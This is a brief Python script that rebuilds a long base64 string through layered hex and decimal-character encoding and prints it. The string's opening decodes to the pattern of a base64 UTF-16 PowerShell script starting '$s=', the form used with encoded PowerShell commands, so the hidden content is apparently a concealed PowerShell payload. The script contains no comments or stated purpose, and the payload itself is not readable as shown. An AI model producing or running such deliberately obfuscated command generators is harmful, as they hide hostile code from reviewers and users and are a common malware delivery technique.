import os

os.system('clear')

def decodeAsHex(str):
    return "".join([chr(int(str[i:i+2],16)) for i in range(0, len(str), 2)])

def decodeChar(str):
    return "".join([chr(int(s)) for s in str.split(' ')])

def getBase64():
    command = ""
    command = command + decodeChar(decodeAsHex("3734203635203636203132322036352036382034382036352037342031") + decodeAsHex("31392036352035312036352036382039392036352037362031303320363520353120363520363820383120363520373620313033"))
    command = command + decodeChar(decodeAsHex("363520313230203635203638203130") + decodeAsHex("37203635203739203635203635203131372036352036382038352036352037372031303320363520353420363520363820313033203635203737203635203635203532"))
    command = command + decodeChar(decodeAsHex("3635203638203635203635203734") + decodeAsHex("20313139203635203535203635203637203831203635203937203831203635203537203635203637203939203635203930203635203635203438203635203638203737"))
    command = command + decodeChar(decodeAsHex("3635203839203130332036362031303620363520373120373720363520373820313033203636203130372036352036") + decodeAsHex("37203438203635203737203635203635203438203635203638203737203635203930"))
    command = command + decodeChar(decodeAsHex("313033203635203132312036352036382038312036352037372036352036352035") + decodeAsHex("33203635203637203438203635203738203131392036362031303820363520373120363920363520373720313033203635"))
    command = command + decodeChar(decodeAsHex("313232203635203731203639203635203737203130332036362031303620363520363720393920363520373920313139203635203130372036352037322036352036352038302038312036352031") + decodeAsHex("3130203635"))
    command = command + decodeChar(decodeAsHex("373120313033203635203130302036352036362034382036352037322036352036352037392031303320") + decodeAsHex("36352031313820363520363720353620363520373420313139203635203535203635203637203831"))
    command = command + decodeChar(decodeAsHex("36352031303020313033203635203537203635203639203130372036352039382031303320363620353020363520373120353620363520393720313139203636203130382036352036372034") + decodeAsHex("38203635203835"))
    command = command + decodeChar(decodeAsHex("31303320363620313038203635203732203737203635203130302036352036362037382036352037312038352036352031303020363520363620313131203635203731203536203635203930") + decodeAsHex("203635203635"))
    command = command + decodeChar(decodeAsHex("313033203635203637203438203635203836203831203636203132322036352037312038") + decodeAsHex("35203635203831203130332036362031303420363520373220373720363520393720383120363620313036203635"))
    command = command + decodeChar(decodeAsHex("373020363520363520383920383120363620313231203635203732203737203635203937203831203636") + decodeAsHex("2031313720363520373120393920363520373320363520363520313136203635203730203835203635"))
    command = command + decodeChar(decodeAsHex("3939203130332036362031313220363520363720363520363520373420363520363620313139203635203637203831203635203939203131392036352031313820") + decodeAsHex("3635203731203831203635203738203635"))
    command = command + decodeChar(decodeAsHex("363520313232203635203731203733203635") + decodeAsHex("20383920313139203636203130362036352036382038392036352039302036352036352031303320363520363720343820363520383320363520363620313038"))
    command = command + decodeChar(decodeAsHex("36352037312036392036352039302036352036362031303820363520373220373320363520393920313139203635") + decodeAsHex("20313033203635203639203635203635203130312031313920363520313035203635203639"))
    command = command + decodeChar(decodeAsHex("363920363520313030203831203636203438203635203731203130332036352039") + decodeAsHex("38203131392036362031323120363520373120313037203635203130312031303320363620313034203635203732203831"))
    command = command + decodeChar(decodeAsHex("363520393720383120363620") + decodeAsHex("313138203635203731203532203635203733203130332036352035372036352036372038312036352039372038312036362035372036352036382031313520363520313030"))
    command = command + decodeChar(decodeAsHex("313139203636203131312036352037312031303720363520393820363520363620313038") + decodeAsHex("2036352036372036352036352037352036352036352031303720363520373220383120363520393920313033203636"))
    command = command + decodeChar(decodeAsHex("34392036352037312038352036352037352038312036362035352036352036372038312036352038392031313920363520353720363520363720313033203635203833203831203636203131") + decodeAsHex("37203635203732"))
    command = command + decodeChar(decodeAsHex("38392036352039382031313920363620313134203635203731203835203635203736203831203636203833") + decodeAsHex("20363520373120383520363520393920313139203636203438203635203639203438203635203930"))
    command = command + decodeChar(decodeAsHex("38312036362034382036352037312031303320363520393820313139203636203130372036352036372036352036352037362038312036362038362036352037322037") + decodeAsHex("37203635203930203831203636203637"))
    command = command + decodeChar(decodeAsHex("363520373120363920363520393920313139203636203131322036352037312037372036352038352036352036362031303420363520") + decodeAsHex("37322037332036352039392031313920363620313132203635203731"))
    command = command + decodeChar(decodeAsHex("35322036352039302031313920363520313033203635203637203438203635203836203831203636203132312036352037312031303720363520373320363520363520313037203635203732203635") + decodeAsHex("203635"))
    command = command + decodeChar(decodeAsHex("37342036352036362031323220363520363720") + decodeAsHex("35362036352037372036352036352034382036352036382037372036352039302031303320363520313231203635203638203831203635203737203635203635"))
    command = command + decodeChar(decodeAsHex("353320363520363720363520363520373620383120363620373320363520373120383520363520383920383120363620313037203635") + decodeAsHex("2037312038352036352039392031303320363620313232203635203637"))
    command = command + decodeChar(decodeAsHex("36352036352038312036352036362035352036352036372037332036352038") + decodeAsHex("3120383120363620343920363520373220383120363520393720363520363620313138203635203732203733203635203937"))
    command = command + decodeChar(decodeAsHex("383120363620353420363520373120363920363520") + decodeAsHex("313030203635203636203131322036352037312035362036352039382031303320363520313035203635203638203438203635203734203635203636"))
    command = command + decodeChar(decodeAsHex("31313220363520373220343820363520") + decodeAsHex("37352038312036352035352036352037312031303720363520393020313033203635203130332036352036372031303320363520373420363520363620313036203635"))
    command = command + decodeChar(decodeAsHex("3637") + decodeAsHex("20363520363520373620383120363620313137203635203731203835203635203733203635203635203131302036352036392035322036352039382031313920363620313137203635203731203835"))
    command = command + decodeChar(decodeAsHex("363520373420313139203635203131322036352036372036352036352031303120313139203635203130372036352037322037332036352038302038312036362031313220363520") + decodeAsHex("373120383520363520313031"))
    command = command + decodeChar(decodeAsHex("36352036352031303320") + decodeAsHex("363520363720383120363520383920313139203635203130332036352036372034382036352038322038312036362031323120363520373220373320363520393820313139203636"))
    command = command + decodeChar(decodeAsHex("3132312036352036392036392036352038392031313920363620343820363520373120313037203635203938203131392036362031313720363520") + decodeAsHex("363720363520363520383520313139203636203438203635"))
    command = command + decodeChar(decodeAsHex("3731203536203635203939203635203635203130332036352036372034382036352038322038312036362031323120") + decodeAsHex("36352037322037332036352039382031313920363620313231203635203730203839"))
    command = command + decodeChar(decodeAsHex("363520383920383120363620313231203635203731203130372036352038392038") + decodeAsHex("31203636203130352036352037312031313920363520393020383120363520313033203635203731203835203635203739"))
    command = command + decodeChar(decodeAsHex("3131392036352031303720363520373220373320363520383020383120") + decodeAsHex("3636203830203635203732203835203635203130302036352036352031313620363520373020373720363520313030203635203636"))
    command = command + decodeChar(decodeAsHex("3132312036352037") + decodeAsHex("31203130372036352039382031303320363620313130203635203637203635203635203736203831203636203734203635203731203532203635203939203635203636203439203635"))
    command = command + decodeChar(decodeAsHex("37322038312036352038342031313920363620313035203635203731203131312036352039302038312036362031303620363520373220383120363520373320363520363520313037203635203732") + decodeAsHex("203733"))
    command = command + decodeChar(decodeAsHex("3635203739203131392036352031303720363520373220383120363520383020383120363620") + decodeAsHex("373420363520373120353220363520313030203130332036362031313820363520373120313135203635203930"))
    command = command + decodeChar(decodeAsHex("38312036352031313620363520373020373320363520393020383120363620313232203635203732203831203635203834203831203636203130") + decodeAsHex("3820363520373220383120363520393720363520363620313138"))
    command = command + decodeChar(decodeAsHex("3635203731203831203635203733") + decodeAsHex("20363520363520313136203635203730203835203635203939203130332036362031313220363520363720363520363520373420363520363620313139203635203637"))
    command = command + decodeChar(decodeAsHex("3831203635203939203131392036352031313820363520363820393920363520393020383120363620313034203635203638203733203635203737203131392036362031303420363520363820373320") + decodeAsHex("3635"))
    command = command + decodeChar(decodeAsHex("38392031313920363520313033203635203637203438203635203834203831203636203130382036352037322038312036352039372036352036362031313820363520373120") + decodeAsHex("3831203635203733203635"))
    command = command + decodeChar(decodeAsHex("363620383120") + decodeAsHex("36352036392035362036352038352031313920363620383520363520363720363520363520373620383120363620373320363520373120383520363520383920383120363620313037203635"))
    command = command + decodeChar(decodeAsHex("37312038352036352039392031303320363620313232203635203637203635203635203831203635203636203535") + decodeAsHex("203635203637203733203635203831203831203636203439203635203732203831203635"))
    command = command + decodeChar(decodeAsHex("3937203635203636203131382036352037322037332036352039372038312036362035342036352037312036392036352031303020363520363620313132203635203731203536203635203938") + decodeAsHex("20313033"))
    command = command + decodeChar(decodeAsHex("3635203130352036352036382034382036352037342036352036362031313220363520373220343820363520373320363520363520") + decodeAsHex("3131362036352036392037332036352039382031313920363620313037"))
    command = command + decodeChar(decodeAsHex("363520373220") + decodeAsHex("3130372036352037332036352036352031313120363520373020313135203635203835203131392036362035332036352037322037372036352031303020363520363620313038203635203731"))
    command = command + decodeChar(decodeAsHex("3438203635") + decodeAsHex("203736203130332036362038352036352037312038352036352031303120363520363620343820363520363720353220363520383220383120363620313137203635203731203737203635203938"))
    command = command + decodeChar(decodeAsHex("3131392036362031303720363520373120313037203635203938203130332036362031313020363520373020343820363520373920313033203635203534203635203730203835203635") + decodeAsHex("203836203635203636"))
    command = command + decodeChar(decodeAsHex("37312036352036382031303320363520373620313033203636203732203635203731") + decodeAsHex("20383520363520313030203635203636203637203635203732203130372036352031303020363520363620313038203635"))
    command = command + decodeChar(decodeAsHex("3732203737203635203735203635203635203130372036352037312038352036352037352031313920363520313037203635203732203733203635203735203831203635") + decodeAsHex("20313033203635203637203438"))
    command = command + decodeChar(decodeAsHex("36352039372031303320363620") + decodeAsHex("3131382036352037312031303720363520393820313033203635203130332036352036372039392036352037332036352036352031313020363520363720313037203635"))
    command = command + decodeChar(decodeAsHex("313032") + decodeAsHex("20383120363520313033203635203732203737203635203938203635203636203130382036352037312038352036352039392036352036352031303320363520363820363520363520373620313033"))
    command = command + decodeChar(decodeAsHex("363520353220363520373220343820363520383320363520363620") + decodeAsHex("3835203635203639203733203635203130312031313920363520343920363520373220383520363520393920363520363520313232203635"))
    command = command + decodeChar(decodeAsHex("373220373320363520383820313139203635203132322036352036382038312036352037382038") + decodeAsHex("31203636203533203635203730203536203635203938203831203635203438203635203731203737203635"))
    return command + decodeChar(decodeAsHex("393920313033203635203131392036352036382038352036352031303220383120") + decodeAsHex("3635203631"))

print(getBase64())
